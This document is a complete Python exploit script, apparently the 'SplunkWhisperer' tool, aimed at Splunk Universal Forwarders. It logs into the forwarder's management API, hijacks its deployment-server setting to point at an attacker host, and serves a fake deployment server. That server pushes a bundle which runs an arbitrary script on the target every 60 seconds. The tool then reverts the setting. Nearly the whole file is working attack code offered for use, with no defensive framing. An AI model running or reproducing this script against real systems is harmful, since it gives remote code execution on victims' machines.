#!/usr/bin/python3

import requests
import sys, os, tempfile, shutil
import time
import tarfile
import re
import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl
import hashlib
import threading

# adjust these parameters before running the script!
LHOST = '127.0.0.1'
LPORT = 8989
RHOST = '127.0.0.1'
RPORT = 8089
# note, the forwarder will not allow remote connections with default credentials
SPLUNK_USER = 'admin'
SPLUNK_PASSWORD = 'changeme'
SCRIPT = './runme.sh'

# leave these as is!
CERT_FILE = 'splunk_whisperer.pem'
SPLUNK_SERVER_CLASS = 'a5105e8b9d40e1329780d62ea2265d8a' # avoid name collisions
SPLUNK_APP_NAME = '_server_app_' + SPLUNK_SERVER_CLASS
BUNDLE_FILE = None
BUNDLE_CHECKSUM = None

# fake deployment server will set this to True
# once the application is served to the forwarder
MISSION_SUCCESS = False

class FakeDeploymentServerHandler(BaseHTTPRequestHandler):
    def _send_xml_headers(self, len):
        self.send_response(200)
        self.send_header('Expires', 'Thu, 26 Oct 1978 00:00:00 GMT')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Content-type', 'text/xml; charset=UTF-8')
        self.send_header('Content-Length', str(len))
        self.end_headers()

    def _send_xml_response(self, response):
        response = response.encode('utf-8')

        self._send_xml_headers(len(response))
        self.wfile.write(response)
        self.wfile.flush()

    def _send_stream_headers(self, len, file_name):
        self.send_response(200)
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Content-Type', 'octet-stream')
        self.send_header('Content-Length', str(len) )
        self.send_header('File-Name', file_name)
        self.end_headers()

    def _send_file(self, filePath, sendName):
        with open(filePath, 'rb') as f:
            data = f.read()
            self._send_stream_headers(len(data), sendName)
            self.wfile.write(data)

    def version_string(self):
        return "Splunkd"

    def do_GET(self):
        # all UF requests are POST
        logging.error("Received unrecognized request: {}".format(self.requestline))
        response = '<?xml version="1.0" encoding="UTF-8"?>\n'
        response += '<msg status="ok"/>'
        self._send_xml_response(response)

    def do_POST(self):
        global MISSION_SUCCESS

        # /services/broker/connect/14090CEB-4F2F-49FC-87DF-1128AB2074DE/vbox/03bbabbd5c0f/linux-x86_64/8189/7.0.2/14090CEB-4F2F-49FC-87DF-1128AB2074DE/universal_forwarder/vbox
        connect_re = r'/services/broker/connect/([^\/]+)/([^\/]+)/.*'
        m = re.match(connect_re, self.path)
        if m:
            clientName = m.group(1)
            clientName2 = m.group(2)
            response = '<?xml version="1.0" encoding="UTF-8"?>\n'
            response += '<msg status="ok">connection_{}_{}_localhost_{}_{}</msg>\n'.format(LHOST, LPORT, clientName2, clientName)
            self._send_xml_response(response)
            return

        # /services/broker/channel/subscribe/connection_127.0.0.1_8089_localhost_vbox_14090CEB-4F2F-49FC-87DF-1128AB2074DE/tenantService%2Fhandshake%2Freply%2Fvbox%2F14090CEB-4F2F-49FC-87DF-1128AB2074DE
        if self.path.startswith("/services/broker/channel/subscribe/"):
            response = '<?xml version="1.0" encoding="UTF-8"?>\n'
            response += '<msg status="ok"/>\n'
            self._send_xml_response(response)
            return

        # /services/broker/phonehome/connection_127.0.0.1_8089_localhost_vbox_14090CEB-4F2F-49FC-87DF-1128AB2074DE
        phoneHome_re = r'\/services\/broker\/phonehome\/connection_.*_([^_]+)_([^_]+)$'
        m = re.match(phoneHome_re, self.path)
        # if self.path.startswith("/services/broker/phonehome/"):
        if m:
            clientName = m.group(1)
            clientID = m.group(2)
            content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
            phoneHome = self.rfile.read(content_length) # <--- Gets the data itself
            phoneHome = phoneHome.decode('utf-8')
            if '<publish channel="deploymentServer/phoneHome/default">' in phoneHome:
                # <publish channel="deploymentServer/phoneHome/default">&lt;phonehome token="default"/&gt;</publish>
                response = '<messages status="ok">\n'
                response += '<message connectionId="connection_{LHOST}_{LPORT}_{clientName}_direct_ds_default" hostname="direct" ipAddress="{LHOST}" connName="ds_default" '.format(LHOST=LHOST, LPORT=LPORT, clientName=clientName)
                response += 'channel="deploymentServer/phoneHome/default/reply/{}/{}">'.format(clientName, clientID)
                response += '&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n'
                response += '&lt;deployResponse restartSplunkd="false" restartSplunkWeb="false" stateOnClient="enabled" issueReload="false" repositoryLocation="$SPLUNK_HOME/etc/apps" endpoint="$deploymentServerUri$/services/streams/deployment?name=$tenantName$:$serverClassName$:$appName$"&gt;\n'
                response += '&lt;serverClass name="{}" restartSplunkd="true"&gt;\n'.format(SPLUNK_SERVER_CLASS)
                response += '&lt;app name="{}" checksum="{}"/&gt;\n'.format(SPLUNK_APP_NAME, BUNDLE_CHECKSUM)
                response += '&lt;/serverClass&gt;\n'
                response += '&lt;/deployResponse&gt;\n'
                response += '</message>\n'
                response += '</messages>\n'
            elif '<publish channel="tenantService/handshake">' in phoneHome:
                response = '<messages status="ok">\n'
                response += '<message connectionId="connection_{LHOST}_{LPORT}_{clientName}_direct_tenantService" hostname="direct" ipAddress="{LHOST}" connName="tenantService" channel="tenantService/handshake/reply/{clientName}/{clientID}">&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n'.format(LHOST=LHOST, LPORT=LPORT, clientName=clientName, clientID=clientID)
                response += '&lt;tenancy&gt;\n'
                response += '&lt;status&gt;ok&lt;/status&gt;\n'
                response += '&lt;tenantId&gt;default&lt;/tenantId&gt;\n'
                response += '&lt;phoneHomeTopic&gt;deploymentServer/phoneHome/default&lt;/phoneHomeTopic&gt;\n'
                response += '&lt;token&gt;default&lt;/token&gt;\n'
                response += '&lt;/tenancy&gt;\n'
                response += '</message>\n'
                response += '</messages>\n'
            else:
                response = '<messages status="ok"/>'

            self._send_xml_response(response)
            return

        # /services/streams/deployment?name=default:test1:_server_app_test1
        if self.path.startswith('/services/streams/deployment'):
            # path
            bundle_name = "{}-{}.bundle".format(SPLUNK_APP_NAME, int(time.time()))
            self._send_file(BUNDLE_FILE, bundle_name)
            MISSION_SUCCESS = True
            return

        logging.error("Received unrecognized request: {}".format(self.requestline))
        # try to fake it anyway
        response = '<?xml version="1.0" encoding="UTF-8"?>\n'
        response += '<msg status="ok"/>'
        self._send_xml_response(response)


class SplunkUFManager:

    def __init__(self, splunk_base_url):
        self.base_url = splunk_base_url

    def get_deployment_config(self):
        session = self._get_authenticated_splunk_session()

        r = session.get(self.base_url+"/services/admin/deploymentclient/")
        if r.status_code != requests.codes.ok:
            logging.error("Cannot retrieve current deployment client configuration, HTTP code {}, message: {}".format(r.status_code, r.text))
            sys.exit(2)

        clientName = deploymentServer = None

        # <s:key name="clientName">14090CEB-4F2F-49FC-87DF-1128AB2074DE</s:key>
        clientName_re = r'<s:key name="clientName">([\dA-F\-]{36})<\/s:key>'
        m = re.search(clientName_re, r.text)
        if m:
            clientName = m.group(1)
        else:
            logging.warning("clientName not found in the UF reponse: {}".format(r.text))
            # do not exit, this parameter is not critical
                
        # <s:key name="targetUri">localhost:8289</s:key>
        deploymentServer_re = r'<s:key name="targetUri">([\w\d\-_\:\.]+)<\/s:key>'
        m = re.search(deploymentServer_re, r.text)
        if m:
            deploymentServer = m.group(1)
        else:
            logging.error("deploymentServer not found in the UF reponse: {}".format(r.text))
            sys.exit(4)

        return (clientName, deploymentServer)

    def _get_authenticated_splunk_session(self):
        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': 'SplunkCli/6.0 (build 03bbabbd5c0f)'})

        login_params = { "username": SPLUNK_USER, "password": SPLUNK_PASSWORD, "cookie": "1" }
        r = session.post( self.base_url+"/services/auth/login", data=login_params)
        if r.status_code != requests.codes.ok:
            logging.error("Splunk login failed, HTTP code {}, message: {}".format(r.status_code, r.text))
            sys.exit(1)

        return session

    def set_deployment_server(self, deployment_uri):
        session = self._get_authenticated_splunk_session()

        deployment_params = {"targetUri": deployment_uri}
        r = session.post(self.base_url+"/services/admin/deploymentclient/deployment-client/", data=deployment_params)
        if r.status_code != requests.codes.ok:
            logging.error("Failed to update deployment server settings, HTTP code {}, message: {}".format(r.status_code, r.text))
            sys.exit(5)


def start_fake_deployment_server(port):
    server_address = ('', port)
    httpd = HTTPServer(('',port), FakeDeploymentServerHandler)
    # openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=CERT_FILE)

    th = threading.Thread(target=httpd.serve_forever)
    th.daemon = True
    th.start()
    return httpd

def get_splunk_bundle_checksum(file_path):
    # Splunk bundle checksum is the higher half of the file's MD5 (64 bits) in decimal
    # (source: https://answers.splunk.com/answers/113792/multiple-deployment-servers-checksum-mismatch-among-instances-of-apps.html#answer-113818)
    with open(file_path, 'rb') as f:
        data = f.read()
    
    md5 = hashlib.md5(data).hexdigest()
    md5 = md5[:16]
    return int(md5, 16)

def create_splunk_bundle(script_path):
    tmp_path = tempfile.mkdtemp()

    bin_dir = os.path.join(tmp_path, "bin")
    os.mkdir(bin_dir)
    shutil.copy(script_path, bin_dir)
    # make the script executable - not 100% certain this makes a difference
    os.chmod(os.path.join(bin_dir, os.path.basename(script_path)), 0o700)

    local_dir = os.path.join(tmp_path, "local")
    os.mkdir(local_dir)
    inputs_conf = os.path.join(local_dir, "inputs.conf")
    with open(inputs_conf, "w") as f:
        inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, os.path.basename(script_path))
        inputs += 'disabled = false\n'
        inputs += 'index = default\n'
        inputs += 'interval = 60.0\n'
        inputs += 'sourcetype = test\n'
        f.write(inputs)

    (fd, tmp_bundle) = tempfile.mkstemp()
    os.close(fd)
    with tarfile.TarFile(tmp_bundle, mode="w") as tf:
        tf.add(bin_dir, arcname="bin")
        tf.add(local_dir, arcname="local")

    shutil.rmtree(tmp_path)
    return tmp_bundle


if __name__ == "__main__":

    # 0 - prep
    # check we have a certificate file
    if not os.path.isfile(CERT_FILE):
        logging.error("Certificate file not found, generate one using the following command:")
        logging.error("openssl req -x509 -newkey rsa:2048 -keyout {fname} -out {fname} -days 365 -nodes".format(fname=CERT_FILE))
        sys.exit(3)

    # prepare the Splunk app bundle from the provided script
    BUNDLE_FILE = create_splunk_bundle(SCRIPT)
    BUNDLE_CHECKSUM = get_splunk_bundle_checksum(BUNDLE_FILE)

    splunk_base_url = "https://"+RHOST+":"+str(RPORT)
    uf_handler = SplunkUFManager(splunk_base_url)

    # 1 - retrieve current UF configuration
    print("Getting current UF settings...")
    clientName, deploymentServer = uf_handler.get_deployment_config()
    if clientName:
        print("Target clientName = {}".format(clientName))
    print("Target deploymentServer = {}".format(deploymentServer))

    # 2 - update the deployment server setting
    uf_handler.set_deployment_server("{}:{}".format(LHOST, LPORT))
    print("Successfully hijacked forwarder's deployment server settings")
    
    # 3 - DO USEFUL STUFF
    print("And now the fun begins...")
    httpd = start_fake_deployment_server(LPORT)
    while not MISSION_SUCCESS:
        time.sleep(5)
    httpd.shutdown()
    print("The deed is done!")
    print("Waiting for Splunk UF to restart...")
    time.sleep(15)

    # 4 - cleanup - revert the deployment server setting
    print("Cleaning up...")
    os.remove(BUNDLE_FILE)

    # revert the deployment server setting
    uf_handler.set_deployment_server(deploymentServer)
    print("Successfully reverted forwarder's deployment server settings")
